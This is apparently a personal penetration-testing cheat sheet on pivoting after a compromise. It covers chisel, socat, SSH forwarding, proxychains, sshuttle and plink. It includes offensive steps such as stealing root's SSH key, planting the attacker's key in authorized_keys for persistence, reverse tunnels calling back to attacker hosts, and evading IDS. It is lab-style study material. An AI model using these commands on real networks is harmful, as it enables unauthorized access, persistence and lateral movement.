# Pivoting 

## Readme

https://cheatsheet.haax.fr/network/pivot_techniques/
https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html

## Note about chisel

chisel performs HTTP tunneling thus aboiding most IDS. Use encryption for better efficiency.

## Persist

It is important to establish persistence before moving forward with actions on objectives.


### simple listener

`nc -lvnpk <PORT>`

this makes a listener that persists even if client disconnects.

### Configuring SSH on Linux

#### private ssh key

1. copy roots private key: copy-paste in vim is enough

`vim root_key`

2. login via ssh using the key

`ssh -i root_key root@VICTIM_IP`

#### inject your own public key into authorized hosts

```bash
cat id_ed25519.pub >> authorized_keys

# root or any other user
ssh -l root VICTIM_IP
```

## Prot forwarding

```bash
# Listen on 443 and forward all incomming connections to local port 1389

socat -v TCP-LISTEN:443,reuseaddr,fork TCP:127.0.0.1:1389
```



##  Proxies

### Forward proxy

some service is listening at victim and connection is incomming from atacker 


### static  forwardin


 <local-interface>:<local-port>:<remote-host>:<remote-port>

which does  port forwarding, sharing server's `<remote-host>:<remote-port>` on clients `<local-interface>:<local-port>`
 
* workflow

Set up new server (this time non socks) on attacker

./chisel server --port 9902

Activate client on victims host

./chisel client 10.10.14.xxx:9902 192.168.1.15:8888:127.0.0.1:443 

So now listener is on 192.168.1.15:8888 which forwards requests to attacker's localhost port 443. Useful to make attacker's external server available from victim within restricted network.

### Reverse proxy

some service is listening at attacker AND connection is incomming from the victim outside firewall



#### static reverse

./chisel server -p 9903 --reverse on local 
./chisel client 10.10.xx.xx:9903 R:127.0.0.1:1280:172.16.xx.xx:80 &

This will open a listener on port 1280 on attackers localhost, and all connections to the target website on 172.16.xx.xx are going to be forwarded via pivot server at 10.10.xx.xx:9903

#### Dynamic reverse proxy

* In this scenario all ports from the victim pivot point aer redirected to attacker so attacker can access Next Victim, which
would be othervise not visible for his network adapter

`./chisel server -p 3333 --reverse --socks5`

* on server


```bash
sudo vim /etc/proxychains4.conf

# socks5 127.0.0.1 1080

./chisel client 172.16.40.5:3333 R:1080:socks

# test

proxychains nmap -F 10.185.10.0/24
```

### Using SSH


#### SSH Local Port Forwarding

* we need to forward packets to target via ssh client's port 4455 over sshserver to target's port 445. where 192.168.11.2 is a pivot point.

`ssh -N -L 0.0.0.0:4455:10.16.223.217:445 root@192.168.11.2`

Attacker can access remote victim port 445 locally on port 4455.

#### SSH Remote Port forwarding

`ssh -N -R 9999:localhost:8080 user@remote`

This command tells SSH to set up a tunnel from the remote machine's port 9999 to your local machine's port 8080. user@remote should be replaced with your actual SSH login credentials and server.

#### SSH Dynamic Port forwarding -> SOCKS

```bash
ssh -D 8080 -f -C -q -N user@yourserver.com
```
-D 8080 sets up the SOCKS proxy on port 8080.

-f asks SSH to go into the background just before command execution.

-C enables compression.

-q enables quiet mode.

-N tells SSH not to execute a remote command.

Then make a socks5 entry in proxy chains for .

##### Multi Hop Scenatio

lets assume: localhost -> 10.11.2.3 -> tor


### Using Socat

#### Forward proxy with socat

`socat -ddd TCP-LISTEN:7777,fork TCP:10.1.11.213:3060`

This line is going to open a listener on 7777 and fork each new connection. New connections are then forwarded to `10.1.11.213:3060`.

This is especially useful if socat is installed on target but not possible to install chisel.

## Configuration for Burp

It can be tricky to use burp with socks but here is a good workaround

1. Setting -> Network -> Connections -> SOCKS proxy 
2. check> Use SOCKS proxy
3. `127.0.0.1 sock_port`
4. in browser selects burps normal proxy `default is 127.0.0.1 8080`
5. no when you browse: attacker -> burp proxy -> socks proxy -> victim
6. Profit!


## scanning with nmap

* run for getting open ports
`seq 1 65535 | xargs -P 50 -I port proxychains -q nmap -p port -sT -T4 10.42.42.2 -oG 10.42.42.2 --open --append-output 10.42.42.2 -Pn -n`

* remove bad lines and save to log file
`grep '/open/' 10.42.42.2 | uniq > openports.log`

* then scan each port separately

## Transparent VPN over ssh

* setup port forward to ssh server: `socat TCP-LISTEN:2222, fork TCP:10.11.222.3:22`
* use sshuttle (requires root privleges): sets up VPN and tunnels mentioned subnets

```bash

sshuttle -r root@127.0.0.1:2222 10.4.22.0/24 192.168.1.0/24

# now routing is setup on localhost to reach mentioned subnets
```

## SSH On windows with plink

use plink to tunnel once reverse shell on windows is obtained

`plink.exe -ssh -l kali -pw Password -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.203`

## DNS tunneling

